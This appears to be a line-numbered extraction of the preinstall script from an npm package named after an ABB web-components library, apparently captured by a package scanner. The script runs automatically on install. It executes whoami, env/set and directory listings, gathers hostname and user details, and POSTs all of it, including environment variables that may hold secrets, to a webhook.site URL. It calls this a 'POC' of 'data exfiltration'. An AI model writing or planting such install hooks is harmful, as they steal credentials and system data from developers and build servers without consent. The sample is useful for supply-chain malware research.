// File: tmp/tmp9uhfv81x/@abb-ux-commonux-web-components/package/preinstall-script.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const https = require('https')
Line 4: const process = require('process')
Line 5: _tmp_0 = require('child_process')
Line 9: const webhookUrl = 'https://webhook.site/c4d98953-a6e6-49f7-9bc8-acf992486460'
Line 12: _tmp_1.push({ name: 'whoami', command: os.platform() === 'win32' ? 'whoami' : 'whoami' })
Line 13: _tmp_1.push({ name: 'pwd_cwd', command: os.platform() === 'win32' ? 'cd' : 'pwd' })
Line 14: _tmp_1.push({ name: 'ls_dir_cwd', command: os.platform() === 'win32' ? 'dir' : 'ls -la' })
Line 15: _tmp_1.push({ name: 'env_set', command: os.platform() === 'win32' ? 'set' : 'env' })
Line 16: _tmp_1.push({ name: 'node_version_check', command: 'node -v' })
Line 17: _tmp_1.push({ name: 'npm_version_check', command: 'npm -v' })
Line 18: _tmp_1.push({ name: 'list_home_directory', command: os.platform() === 'win32' ? `dir "%USERPROFILE%"` : `ls -la ~` })
Line 27: os.hostname()
Line 28: os.userInfo()
Line 29: os.platform()
Line 30: os.arch()
Line 31: os.totalmem()
Line 33: os.cpus()
Line 40: _tmp_13.execPath = process.execPath
Line 50: _iterator_0.next()
Line 51: {
        console.log(`[*] Running command: ${cmdObj.command}`);
        const output = execSync(cmdObj.command, { timeout: 5000, encoding: 'utf-8' }); // 5 second timeout
        collectedData.commandOutputs[cmdObj.name] = {
            status: 'success',
            output: output.trim(),
        };
        console.log(`[+] Command '${cmdObj.name}' executed successfully.`);
    }
Line 52: console.log(`[*] Running command: ${cmdObj.command}`)
Line 53: const output = execSync(cmdObj.command, { timeout: 5000, encoding: 'utf-8' })
Line 54: collectedData.commandOutputs[cmdObj.name] = {
            status: 'success',
            output: output.trim(),
        }
Line 56: output.trim()
Line 58: console.log(`[+] Command '${cmdObj.name}' executed successfully.`)
Line 59: catch (error) {
        console.error(`[-] Error executing command '${cmdObj.name}': ${error.message}`);
        collectedData.commandOutputs[cmdObj.name] = {
            status: 'error',
            error: error.message,
            stdout: error.stdout ? error.stdout.toString().trim() : null,
            stderr: error.stderr ? error.stderr.toString().trim() : null,
        };
    }
Line 60: console.error(`[-] Error executing command '${cmdObj.name}': ${error.message}`)
Line 61: collectedData.commandOutputs[cmdObj.name] = {
            status: 'error',
            error: error.message,
            stdout: error.stdout ? error.stdout.toString().trim() : null,
            stderr: error.stderr ? error.stderr.toString().trim() : null,
        }
Line 64: error.stdout.toString().trim()
Line 65: error.stderr.toString().trim()
Line 71: {
    const payload = JSON.stringify(collectedData, null, 2); // Pretty print JSON for readability
    
    const urlParts = new URL(webhookUrl);

    const options = {
        hostname: urlParts.hostname,
        path: urlParts.pathname + urlParts.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    console.log(`[+] Sending ${Buffer.byteLength(payload)} bytes of data to webhook: ${webhookUrl}`);

    const req = https.request(options, (res) => {
        console.log(`[+] POC data sent. Status: ${res.statusCode}`);
        // res.on('data', (d) => { process.stdout.write(d); }); // Optional: log response
    });

    req.on('error', (error) => {
        console.error('[-] Error sending POC data to webhook:', error.message);
    });

    req.write(payload);
    req.end();
    console.log('[+] Data exfiltration attempt finished.');

}
Line 86: console.log(`[+] Sending ${Buffer.byteLength(payload)} bytes of data to webhook: ${webhookUrl}`)
Line 88: const req = https.request(options, (res) => {
        console.log(`[+] POC data sent. Status: ${res.statusCode}`);
        // res.on('data', (d) => { process.stdout.write(d); }); // Optional: log response
    })
Line 89: console.log(`[+] POC data sent. Status: ${res.statusCode}`)
Line 93: {
        console.error('[-] Error sending POC data to webhook:', error.message);
    }
Line 94: console.error('[-] Error sending POC data to webhook:', error.message)
Line 97: req.write(payload)
Line 98: req.end()
Line 99: console.log('[+] Data exfiltration attempt finished.')
Line 101: catch (e) {
    console.error('[-] FATAL ERROR in preinstall script during data exfiltration:', e.message);
    // Fallback: attempt to write minimal info to a file if network fails (less likely to work in CI)
    try {
        const fs = require('fs');
        const fallbackFile = 'poc_triggered_error.txt';
        fs.writeFileSync(fallbackFile, `Timestamp: ${new Date().toISOString()}\nError: ${e.message}\nHostname: ${os.hostname()}\nCWD: ${process.cwd()}`);
        console.log(`[!] Wrote fallback error info to ${fallbackFile} (if permissions allow).`);
    } catch (fsErr) {
        console.error('[-] Fallback file write also failed:', fsErr.message);
    }
}
Line 102: console.error('[-] FATAL ERROR in preinstall script during data exfiltration:', e.message)
Line 104: {
        const fs = require('fs');
        const fallbackFile = 'poc_triggered_error.txt';
        fs.writeFileSync(fallbackFile, `Timestamp: ${new Date().toISOString()}\nError: ${e.message}\nHostname: ${os.hostname()}\nCWD: ${process.cwd()}`);
        console.log(`[!] Wrote fallback error info to ${fallbackFile} (if permissions allow).`);
    }
Line 105: const fs = require('fs')
Line 107: os.hostname()
Line 108: console.log(`[!] Wrote fallback error info to ${fallbackFile} (if permissions allow).`)
Line 109: catch (fsErr) {
        console.error('[-] Fallback file write also failed:', fsErr.message);
    }
Line 110: console.error('[-] Fallback file write also failed:', fsErr.message)
